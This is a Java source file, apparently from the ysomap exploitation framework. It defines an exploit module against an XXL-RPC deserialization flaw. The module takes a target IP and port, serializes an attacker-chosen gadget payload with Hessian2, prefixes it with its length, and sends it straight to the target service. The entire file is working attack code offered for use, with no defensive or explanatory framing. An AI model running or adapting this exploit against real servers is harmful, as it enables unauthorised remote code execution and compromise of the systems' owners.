package ysomap.exploits.xxlrpc;

import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Hex;
import ysomap.common.annotation.*;
import ysomap.common.util.Status;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.SocketHelper;
import ysomap.exploits.AbstractExploit;
import ysomap.payloads.Payload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

/**
 * @author wh1t3p1g
 * @since 2023/3/13
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {}, param = false)
@Details("xxl-rpc 反序列化漏洞")
public class XXLRPCExploit extends AbstractExploit {

    @NotNull
    @Require(name = "host", detail = "目标IP")
    public String host = null;

    @NotNull
    @Require(name = "port", type = "int",detail = "目标端口")
    public String port = "7080";

    @NotNull
    public Payload payload;
    public String payloadName;


    @Override
    public void work() {
        Serializer serializer = SerializerFactory.createSerializer("hessian2");
        try {
            byte[] data = generate((byte[]) serializer.serialize(payload));
            String ret = SocketHelper.send(host, Integer.parseInt(port), data, 5000);
            System.out.println(ret);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        setStatus(Status.STOPPED);
    }

    public byte[] generate(byte[] payload) throws IOException, DecoderException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        System.out.println(Hex.decodeHex(String.format("%08x", payload.length)));
        baos.write(Hex.decodeHex(String.format("%08x", payload.length)));
        baos.write(payload);
        return baos.toByteArray();
    }
}
